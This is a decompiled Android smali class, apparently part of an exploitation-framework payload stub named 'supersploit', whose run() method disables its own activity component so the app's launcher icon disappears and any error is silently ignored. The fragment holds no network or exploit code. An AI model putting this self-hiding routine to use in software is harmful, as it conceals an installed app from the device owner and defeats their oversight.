.class Lorg/supersploit/stub/RootManagerActivity$1;
.super Ljava/lang/Object;
.source "RootManagerActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/supersploit/stub/RootManagerActivity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/supersploit/stub/RootManagerActivity;


# direct methods
.method constructor <init>(Lorg/supersploit/stub/RootManagerActivity;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 33
    iput-object p1, p0, Lorg/supersploit/stub/RootManagerActivity$1;->this$0:Lorg/supersploit/stub/RootManagerActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 37
    :try_start_0
    iget-object v0, p0, Lorg/supersploit/stub/RootManagerActivity$1;->this$0:Lorg/supersploit/stub/RootManagerActivity;

    invoke-virtual {v0}, Lorg/supersploit/stub/RootManagerActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 38
    new-instance v1, Landroid/content/ComponentName;

    iget-object v2, p0, Lorg/supersploit/stub/RootManagerActivity$1;->this$0:Lorg/supersploit/stub/RootManagerActivity;

    const-class v3, Lorg/supersploit/stub/RootManagerActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 39
    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 40
    :catch_0
    move-exception v0

    :goto_0
    nop

    .line 41
    return-void
.end method
